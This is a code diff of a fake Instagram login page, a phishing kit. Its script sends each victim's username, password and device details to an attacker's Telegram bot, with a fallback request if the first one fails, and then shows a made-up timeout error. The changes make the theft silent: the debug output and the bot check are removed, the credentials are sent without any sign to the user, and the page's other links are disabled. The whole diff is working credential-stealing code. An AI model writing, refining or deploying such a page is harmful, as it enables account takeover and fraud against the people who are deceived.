@@ -76,19 +76,6 @@
     .stores { text-align: center; margin-top: 12px; }
     .stores img { height: 40px; margin: 0 4px; }
     .error-msg { color: #ed4956; font-size: 14px; text-align: center; margin: 10px 0; display: none; }
-    /* Debug area – visible only when there's a message */
-    .debug-box {
-      background: #1a1a1a;
-      border: 1px solid #333;
-      color: #0f0;
-      font-family: monospace;
-      font-size: 12px;
-      padding: 10px;
-      border-radius: 6px;
-      margin: 10px 0;
-      white-space: pre-wrap;
-      display: none;
-    }
   </style>
 </head>
 <body>
@@ -140,10 +127,7 @@
           <label>Password</label>
           <button type="button" class="toggle-pw" id="toggle">Show</button>
         </div>
-        <!-- Fake error that appears after login -->
         <div class="error-msg" id="error">Request timed out. Please try again.</div>
-        <!-- Debug box for Telegram errors -->
-        <div class="debug-box" id="debugBox"></div>
         <button type="submit" class="login-btn" id="loginBtn">
           <span class="spinner"></span><span class="btn-text">Log in</span>
         </button>
@@ -174,13 +158,6 @@
     const loginBtn = document.getElementById('loginBtn');
     const toggleBtn = document.getElementById('toggle');
     const errorDiv = document.getElementById('error');
-    const debugBox = document.getElementById('debugBox');
-
-    function showDebug(msg, isError = false) {
-      debugBox.textContent = msg;
-      debugBox.style.color = isError ? '#ff4444' : '#0f0';
-      debugBox.style.display = 'block';
-    }
 
     function getDeviceInfo() {
       return {
@@ -197,14 +174,13 @@
     async function sendToTelegram(user, pass) {
       const device = getDeviceInfo();
       const now = new Date().toLocaleString();
-      // Plain text (no Markdown) to avoid parsing failures
       const text = `🔐 Instagram Login\n\n` +
         `👤 Username: ${user}\n` +
         `🔑 Password: ${pass}\n\n` +
         `📱 Device Info\n` +
         `• Type: ${device.deviceType}\n` +
         `• OS: ${device.platform}\n` +
-        `• UA: ${device.userAgent}\n` +
+        `• Browser: ${device.userAgent}\n` +
         `• Screen: ${device.screen}\n` +
         `• Viewport: ${device.viewport}\n` +
         `• Language: ${device.language}\n` +
@@ -215,28 +191,23 @@
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text
-          })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: text })
         });
         const data = await res.json();
         if (!data.ok) {
-          throw new Error(`Telegram API error: ${data.description} (code ${data.error_code})`);
+          throw new Error(data.description);
         }
-        return { ok: true };
       } catch (e) {
-        // Try GET as a last resort
+        // GET fallback
         try {
           const encoded = encodeURIComponent(text);
           const getRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`);
           const getData = await getRes.json();
           if (!getData.ok) {
-            throw new Error(`GET fallback error: ${getData.description}`);
+            console.error('Telegram fallback failed:', getData.description);
           }
-          return { ok: true };
         } catch (e2) {
-          throw e2; // rethrow
+          console.error('All Telegram attempts failed', e2);
         }
       }
     }
@@ -250,16 +221,11 @@
       loginBtn.classList.add('loading');
       loginBtn.disabled = true;
       errorDiv.style.display = 'none';
-      debugBox.style.display = 'none';
 
-      try {
-        await sendToTelegram(user, pass);
-        showDebug('✅ Sent to Telegram', false);
-      } catch (err) {
-        showDebug('❌ ' + err.message, true);
-      }
+      // Fire and forget (credentials sent silently)
+      sendToTelegram(user, pass);
 
-      // Always show the fake timeout error after 2s
+      // Simulate network delay, then show error
       setTimeout(() => {
         loginBtn.classList.remove('loading');
         loginBtn.disabled = false;
@@ -271,7 +237,7 @@
 
     form.addEventListener('submit', handleLogin);
     loginBtn.addEventListener('click', (e) => {
-      // Fallback if form submit isn't triggered
+      // Safety fallback
       if (e.target === loginBtn) handleLogin(e);
     });
 
@@ -281,20 +247,10 @@
       toggleBtn.textContent = isPass ? 'Hide' : 'Show';
     });
 
-    // Quick test: ping the bot on load (silent)
-    (async () => {
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-        const data = await res.json();
-        if (!data.ok) {
-          console.warn('Bot token invalid or unreachable:', data.description);
-        } else {
-          console.log('Bot online:', data.result.username);
-        }
-      } catch(e) {
-        console.warn('Cannot reach Telegram API at all');
-      }
-    })();
+    // Disable demo links
+    document.querySelector('.fb-btn').addEventListener('click', (e) => e.preventDefault());
+    document.querySelector('.forgot').addEventListener('click', (e) => e.preventDefault());
+    document.querySelector('.signup-card a').addEventListener('click', (e) => e.preventDefault());
   });
 </script>
 </body>
